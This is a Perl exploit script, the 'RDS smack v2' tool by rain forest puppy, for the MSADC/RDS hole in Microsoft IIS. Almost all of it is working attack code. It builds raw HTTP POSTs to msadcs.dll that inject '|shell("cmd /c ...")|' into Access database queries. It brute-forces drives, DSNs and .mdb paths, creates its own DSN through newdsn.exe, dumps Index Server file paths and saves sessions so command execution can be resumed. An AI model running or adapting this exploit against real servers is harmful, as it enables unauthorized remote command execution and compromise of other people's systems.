#!/usr/bin/perl
#
# MSADC/RDS 'usage' (aka exploit) script version 2
#
#	by rain forest puppy
#
#	- added UNC support, really didn't clean up code, but oh well

use Socket; use Getopt::Std;
getopts("e:vd:h:XRVNwcu:s:", \%args);

print "-- RDS smack v2 - rain forest puppy / ADM / wiretrip --\n";

if (!defined $args{h} && !defined $args{R}) {
print qq~
Usage: msadc.pl -h <host> { -d <delay> -X -v }
	-h <host> 		= host you want to scan (ip or domain)
	-d <seconds>		= delay between calls, default 1 second
	-X			= dump Index Server path table, if available
	-N			= query VbBusObj for NetBIOS name
	-V			= use VbBusObj instead of ActiveDataFactory
	-v			= verbose
	-e			= external dictionary file for step 5
	-u <\\\\host\\share\\file>	= use UNC file
	-w			= Windows 95 instead of Windows NT
	-c			= v1 compatibility (three step query)
	-s <number>		= run only step <number>

	Or a -R will resume a (v2) command session

~; exit;}

###########################################################
# config data

@drives=("c","d","e","f","g","h");

@sysdirs=("winnt","winnt35","winnt351","win","windows");

# we want 'wicca' first, because if step 2 made the DSN, it's ready to go
@dsns=("wicca", "AdvWorks", "pubs", "CertSvr", "CFApplications",
	"cfexamples", "CFForums", "CFRealm", "cfsnippets", "UAM",
	"banner", "banners", "ads", "ADCDemo", "ADCTest");

# this is sparse, because I don't know of many
@sysmdbs=(	"\\catroot\\icatalog.mdb",
		"\\help\\iishelp\\iis\\htm\\tutorial\\eecustmr.mdb",
		"\\system32\\help\\iishelp\\iis\\htm\\tutorial\\eecustmr.mdb",
		"\\system32\\certmdb.mdb",
		"\\system32\\ias\\ias.mdb",
		"\\system32\\ias\\dnary.mdb",
		"\\system32\\certlog\\certsrv.mdb" ); #these are %systemroot%
@mdbs=(	"\\cfusion\\cfapps\\cfappman\\data\\applications.mdb",
	"\\cfusion\\cfapps\\forums\\forums_.mdb",
	"\\cfusion\\cfapps\\forums\\data\\forums.mdb",
	"\\cfusion\\cfapps\\security\\realm_.mdb",
	"\\cfusion\\cfapps\\security\\data\\realm.mdb",
	"\\cfusion\\database\\cfexamples.mdb",
	"\\cfusion\\database\\cfsnippets.mdb",
	"\\inetpub\\iissamples\\sdk\\asp\\database\\authors.mdb",
	"\\progra~1\\common~1\\system\\msadc\\samples\\advworks.mdb",
	"\\cfusion\\brighttiger\\database\\cleam.mdb",
	"\\cfusion\\database\\smpolicy.mdb",
	"\\cfusion\\database\cypress.mdb",
	"\\progra~1\\ableco~1\\ablecommerce\\databases\\acb2_main1.mdb",
	"\\website\\cgi-win\\dbsample.mdb",
	"\\perl\\prk\\bookexamples\\modsamp\\database\\contact.mdb",
	"\\perl\\prk\\bookexamples\\utilsamp\\data\\access\\prk.mdb"
	);  #these are just \
###########################################################

$ip=$args{h}; $clen=0; $reqlen=0; $|=1; $target="";
if (defined $args{v}) { $verbose=1; } else {$verbose=0;} 
if (defined $args{d}) { $delay=$args{d};} else {$delay=1;}
if(!defined $args{R}){ $target= inet_aton($ip) 
	|| die("inet_aton problems; host doesn't exist?");}
if (!defined $args{R}){ $ret = &has_msadc; }

if (defined $args{X}) { &hork_idx; exit; }
if (defined $args{N}) { &get_name; exit; }

if (defined $args{w}){$comm="command /c";} else {$comm="cmd /c";}
if (defined $args{R}) { &load; exit; }

print "Type the command line you want to run ($comm assumed):\n"
	. "$comm ";
$in=<STDIN>;    chomp $in;
$command="$comm " . $in ;

if (!defined $args{s} || $args{s}==1){
print "\nStep 1: Trying raw driver to btcustmr.mdb\n";
&try_btcustmr;}

if (!defined $args{s} || $args{s}==2){
print "\nStep 2: Trying to make our own DSN...";
if (&make_dsn){ print "<<success>>\n"; sleep(3); } else {
	print "<<fail>>\n"; }}   # we need to sleep to let the server catchup

if (!defined $args{s} || $args{s}==3){
print "\nStep 3: Trying known DSNs...";
&known_dsn;}

if (!defined $args{s} || $args{s}==4){
print "\nStep 4: Trying known .mdbs...";
&known_mdb;}

if (!defined $args{s} || $args{s}==5){
if (defined $args{u}){
print "\xStep 5: Trying UNC...";
&use_unc; } else { "\nNo -u; Step 5 skipped.\n"; }}

if (!defined $args{s} || $args{s}==6){
if (defined $args{e}){
print "\nStep 6: Trying dictionary of DSN names...";
&dsn_dict; } else { "\nNo -e; Step 6 skipped.\n"; }}

print "\n\nNo luck, guess you'll have to use a real hack, eh?\n";
exit;

##############################################################################

sub sendraw { 	# this saves the whole transaction anyway
	my ($pstr)=@_;
	socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
		die("Socket problems\n");
	if(connect(S,pack "SnA4x8",2,80,$target)){
		open(OUT,">raw.out");   my @in;
		select(S);	$|=1; 	print $pstr;		
		while(<S>){ print OUT $_; push @in, $_; 
			print STDOUT "." if(defined $args{X});}
		close(OUT); select(STDOUT); close(S); return @in;
	} else { die("Can't connect...\n"); }}

##############################################################################

sub make_header {  # make the HTTP request
my $aa, $bb;
if (defined $args{V}){
$aa="VbBusObj.VbBusObjCls.GetRecordset";
$bb="2";
} else {
$aa="AdvancedDataFactory.Query";
$bb="3";}

$msadc=<<EOT
POST /msadc/msadcs.dll/$aa HTTP/1.1
User-Agent: ACTIVEDATA
Host: $ip
Content-Length: $clen
Connection: Keep-Alive

ADCClientVersion:01.06
Content-Type: multipart/mixed; boundary=!ADM!ROX!YOUR!WORLD!; num-args=$bb

--!ADM!ROX!YOUR!WORLD!
Content-Type: application/x-varg
Content-Length: $reqlen

EOT
;
$msadc=~s/\n/\r\n/g;
return $msadc;}

##############################################################################

sub make_req {  # make the RDS request
my ($switch, $p1, $p2)=@_;
my $req=""; my $t1, $t2, $query, $dsn;

if ($switch==1){ # this is the btcustmr.mdb query
$query="Select * from Customers where City='|shell(\"$command\")|'";
$dsn="driver={Microsoft Access Driver (*.mdb)};dbq=" .
	$p1 . ":\\" . $p2 . "\\help\\iis\\htm\\tutorial\\btcustmr.mdb;";}

elsif ($switch==2){ # this is general make table query
$query="create table AZZ (B int, C varchar(10))";
$dsn="$p1";}

elsif ($switch==3){ # this is general exploit table query
$query="select * from AZZ where C='|shell(\"$command\")|'";
$dsn="$p1";}

elsif ($switch==4){ # attempt to hork file info from index server
$query="select path from scope()";
$dsn="Provider=MSIDXS;";}

elsif ($switch==5){ # bad query
$query="select";
$dsn="$p1";}

elsif ($switch==6){ # this is table-independant query (new)
$query="select * from MSysModules where name='|shell(\"$command\")|'";
$dsn="$p1";}

$t1= make_unicode($query);
$t2= make_unicode($dsn);
if(defined $args{V}) { $req=""; } else {$req = "\x02\x00\x03\x00"; }
$req.= "\x08\x00" . pack ("S1", length($t1));
$req.= "\x00\x00" . $t1 ;
$req.= "\x08\x00" . pack ("S1", length($t2));
$req.= "\x00\x00" . $t2 ;
$req.="\r\n--!ADM!ROX!YOUR!WORLD!--\r\n";
return $req;}

##############################################################################

sub make_unicode { # quick little function to convert to unicode
my ($in)=@_; my $out;
for ($c=0; $c < length($in); $c++) { $out.=substr($in,$c,1) . "\x00"; }
return $out;}

##############################################################################

sub rdo_success {  # checks for RDO return success (this is kludge)
my (@in) = @_; my $base=content_start(@in);
if($in[$base]=~/multipart\/mixed/){
return 1 if( $in[$base+10]=~/^\x09\x00/ );}
return 0;}

##############################################################################

sub make_dsn {  # this (tries to) make a DSN for us
print "\nMaking DSN: ";
foreach $drive (@drives) {
print "$drive: ";
my @results=sendraw("GET /scripts/tools/newdsn.exe?driver=Microsoft\%2B" .
	"Access\%2BDriver\%2B\%28*.mdb\%29\&dsn=wicca\&dbq="
	. $drive . "\%3A\%5Csys.mdb\&newdb=CREATE_DB\&attr= HTTP/1.0\n\n");
$results[0]=~m#HTTP\/([0-9\.]+) ([0-9]+) ([^\n]*)#;
return 0 if $2 eq "404"; # not found/doesn't exist
if($2 eq "200") {
  foreach $line (@results) {
    return 1 if $line=~/<H2>Datasource creation successful<\/H2>/;}}
} return 0;}

##############################################################################

sub verify_exists {
my ($page)=@_;
my @results=sendraw("GET $page HTTP/1.0\n\n");
return $results[0];}

##############################################################################

sub try_btcustmr {

foreach $dir (@sysdirs) {
 print "$dir -> "; # fun status so you can see progress
 foreach $drive (@drives) {
 print "$drive: ";  # ditto
$reqlen=length( make_req(1,$drive,$dir) ) - 28;
$reqlenlen=length( "$reqlen" );
$clen= 206 + $reqlenlen + $reqlen;

my @results=sendraw(make_header() . make_req(1,$drive,$dir));
if (rdo_success(@results)){print "Success!\n";

save("dbq=".$drive.":\\".$dir."\\help\\iis\\htm\\tutorial\\btcustmr.mdb;");
	exit;}
else { verbose(odbc_error(@results)); funky(@results);}} print "\n";}}

##############################################################################

sub odbc_error {
my (@in)=@_; my $base;
my $base = content_start(@in);
if($in[$base]=~/application\/x-varg/){ # it *SHOULD* be this
$in[$base+4]=~s/[^a-zA-Z0-9 \[\]\:\/\\'\(\)]//g; 
$in[$base+5]=~s/[^a-zA-Z0-9 \[\]\:\/\\'\(\)]//g; 
$in[$base+6]=~s/[^a-zA-Z0-9 \[\]\:\/\\'\(\)]//g; 
return $in[$base+4].$in[$base+5].$in[$base+6];}
print "\nNON-STANDARD error.  Please sent this info to rfp\@wiretrip.net:\n";
print "$in : " . $in[$base] . $in[$base+1] . $in[$base+2] . $in[$base+3] .
	$in[$base+4] . $in[$base+5] . $in[$base+6]; exit;}

##############################################################################

sub verbose {
my ($in)=@_;
return if !$verbose;
print STDOUT "\n$in\n";}

##############################################################################

sub save {
my ($p1)=@_; my $ropt="";
open(OUT, ">rds.save") || print "Problem saving parameters...\n";
if (defined $args{c}){ $ropt="c ";}
if (defined $args{V}){ $ropt.="V ";}
if (defined $args{w}){ $ropt.="w ";}
print OUT "v2\n$ip\n$ropt\n$p1\n";
close OUT;}

##############################################################################

sub load {
my ($action)=@_;
my @p; my $drvst="driver={Microsoft Access Driver (*.mdb)};";
open(IN,"<rds.save") || die("Couldn't open rds.save\n");
@p=<IN>; close(IN);
die("Wrong rds.save version") if $p[0] ne "v2\n";
$ip="$p[1]"; $ip=~s/\n//g;
$target= inet_aton($ip) || die("inet_aton problems");
print "Resuming to $ip ...";
@switches=split(/ /,$p[2]);
foreach $switch (@switches) {
	$args{$switch}="1";}

if (defined $args{w}){$comm="command /c";} else {$comm="cmd /c";}
print "Type the command line you want to run ($comm assumed):\n"
	. "$comm ";
$in=<STDIN>;    chomp $in;
$command="$comm " . $in ;

$torun="$p[3]"; $torun=~s/\n//g;
if($torun=~/btcustmr/){ 
	$args{'c'}="1";}   # this is a kludge to make it work

if($torun=~/^dbq/){ $torun=$drvst.$torun; }

if(run_query("$torun")){
	print "Success!\n";} else { print "failed\n"; }
exit;}

##############################################################################

sub create_table {
return 1 if (!defined $args{c});
return 1 if (defined $args{V});
my ($in)=@_;
$reqlen=length( make_req(2,$in,"") ) - 28;
$reqlenlen=length( "$reqlen" );
$clen= 206 + $reqlenlen + $reqlen;
my @results=sendraw(make_header() . make_req(2,$in,""));
return 1 if rdo_success(@results);
my $temp= odbc_error(@results);  verbose($temp);
return 1 if $temp=~/Table 'AZZ' already exists/;
return 0;}

##############################################################################

sub known_dsn {
foreach $dSn (@dsns) {
	print ".";
	next if (!is_access("DSN=$dSn"));
	if(create_table("DSN=$dSn")){
	if(run_query("DSN=$dSn")){
	print "$dSn: Success!\n"; save ("dsn=$dSn"); exit; }}} print "\n";}

##############################################################################

sub is_access {
my ($in)=@_;
return 1 if (!defined $args{c});
return 1 if (defined $args{V});
$reqlen=length( make_req(5,$in,"") ) - 28;
$reqlenlen=length( "$reqlen" );
$clen= 206 + $reqlenlen + $reqlen;
my @results=sendraw(make_header() . make_req(5,$in,""));
my $temp= odbc_error(@results);
verbose($temp); return 1 if ($temp=~/Microsoft Access/);
return 0;}

##############################################################################

sub run_query {
my ($in)=@_; my $req;
if (defined $args{c}){$req=3;} else {$req=6;}
$reqlen=length( make_req($req,$in,"") ) - 28;

$reqlenlen=length( "$reqlen" );
$clen= 206 + $reqlenlen + $reqlen;
my @results=sendraw(make_header() . make_req($req,$in,""));
return 1 if rdo_success(@results);
my $temp= odbc_error(@results);  verbose($temp);
return 0;}

##############################################################################

sub known_mdb {
my @drives=("c","d","e","f","g");
my @dirs=("winnt","winnt35","winnt351","win","windows");
my $dir, $drive, $mdb;
my $drv="driver={Microsoft Access Driver (*.mdb)}; dbq=";

foreach $drive (@drives) {
 foreach $dir (@sysdirs){
  foreach $mdb (@sysmdbs) {
   print ".";
   if(create_table($drv.$drive.":\\".$dir.$mdb)){
    if(run_query($drv . $drive . ":\\" . $dir . $mdb)){
     print "$mdb: Success!\n"; save ("dbq=".$drive .":\\".$dir.$mdb); exit; 
    }}}}}

 foreach $drive (@drives) {
  foreach $mdb (@mdbs) {
   print ".";
   if(create_table($drv.$drive.":".$mdb)){
    if(run_query($drv.$drive.":".$mdb)){
     print "$mdb: Success!\n"; save ("dbq=".$drive.":".$mdb); exit; 
    }}}}
}

##############################################################################

sub hork_idx {
print "\nAttempting to dump Index Server tables...\n";
print "  NOTE:  Sometimes this takes a while, other times it stalls\n\n";
$reqlen=length( make_req(4,"","") ) - 28;
$reqlenlen=length( "$reqlen" );
$clen= 206 + $reqlenlen + $reqlen;
my @results=sendraw(make_header() . make_req(4,"",""));
if (rdo_success(@results)){
my $max=@results; my $c; my %d;
for($c=19; $c<$max; $c++){
	$results[$c]=~s/\x00//g;
	$results[$c]=~s/[^a-zA-Z0-9:~ \\\._]{1,40}/\n/g;
	$results[$c]=~s/[^a-zA-Z0-9:~ \\\._\n]//g;
	$results[$c]=~/([a-zA-Z]\:\\)([a-zA-Z0-9 _~\\]+)\\/;
	$d{"$1$2"}="";}
foreach $c (keys %d){ print "$c\n"; }
} else {print "Index server not installed/query failed\n"; }}

##############################################################################

sub dsn_dict {
open(IN, "<$args{e}") || die("Can't open external dictionary\n");
while(<IN>){
	$hold=$_; $hold=~s/[\r\n]//g; $dSn="$hold"; print ".";
	next if (!is_access("DSN=$dSn"));
	if(create_table("DSN=$dSn")){
	if(run_query("DSN=$dSn")){
	print "Success!\n"; save ("dsn=$dSn"); exit; }}} 
print "\n"; close(IN);}

##############################################################################

sub content_start { # this will take in the server headers
my (@in)=@_; my $c;
for ($c=1;$c<500;$c++) { # assume there's less than 500 headers
 if($in[$c] =~/^\x0d\x0a/){
  if ($in[$c+1]=~/^HTTP\/1.[01] [12]00/) { $c++; }
  else { return $c+1; }}}
return -1;} # it should never get here actually 

##############################################################################

sub funky {
my (@in)=@_; my $error=odbc_error(@in);
if($error=~/ADO could not find the specified provider/){
print "\nServer returned an ADO miscofiguration message\nAborting.\n";
exit;}
if($error=~/A Handler is required/){
print "\nServer has custom handler filters (they most likely are patched)\n";
exit;}
if($error=~/specified Handler has denied Access/){
print "\nADO handlers denied access (they most likely are patched)\n";
exit;}
if($error=~/server has denied access/){
print "\nADO handlers denied access (they most likely are patched)\n";
exit;}}

##############################################################################

sub has_msadc {
my @results=sendraw("GET /msadc/msadcs.dll HTTP/1.0\n\n");
my $base=content_start(@results);
return if($results[$base]=~/Content-Type: application\/x-varg/);
my @s=grep("^Server:",@results);
if($s[0]!~/IIS/){ print "Doh! They're not running IIS.\n$s[0]\n" }
else { print "/msadc/msadcs.dll was not found.\n";}
exit;}

##############################################################################

sub use_unc {
$uncpath=$args{u};
$driverline="driver={Microsoft Access Driver (*.mdb)};dbq=";
if(!$uncpath=~/^\\\\[a-zA-Z0-9_.]+\\[-a-zA-Z0-9_]+\\.+/){
	print   "Your UNC path sucks.  You need the following format:\n".
		"\\server(ip preferable)\share\some-file.mdb\n\n"; exit; }

if(create_table($driverline.$uncpath)){
  if(run_query($driverline.$uncpath)){
     print "Success!\n"; save ("dbq=".$uncpath); exit;}}
}

##############################################################################

sub get_name { # this was added last minute
my $msadc=<<EOT
POST /msadc/msadcs.dll/VbBusObj.VbBusObjCls.GetMachineName HTTP/1.1
User-Agent: ACTIVEDATA
Host: $ip
Content-Length: 126
Connection: Keep-Alive

ADCClientVersion:01.06
Content-Type: multipart/mixed; boundary=!ADM!ROX!YOUR!WORLD!; num-args=0

--!ADM!ROX!YOUR!WORLD!--
EOT
;  $msadc=~s/\n/\r\n/g;
my @results=sendraw($msadc);
my $base=content_start(@results);
$results[$base+6]=~s/[^-A-Za-z0-9!\@\#\$\%^\&*()\[\]_=+~<>.,?]//g;
print "Machine name: $results[$base+6]\n";}

##############################################################################
# special greets to trambottic, hex_edit, vacuum (technotronic), all #!adm,
# #!w00w00 & #rhino9 (that's a lot of people, and they are all very elite and 
# good friends!), wiretrip, l0pht, nmrc & all of phrack
#
# thumbs up to packetstorm, hackernews, phrack, securityfocus, ntsecadvice
#
# I wish I could really name everyone, but I can't.  Don't feel slighted if
# your not on the list... :)
##############################################################################
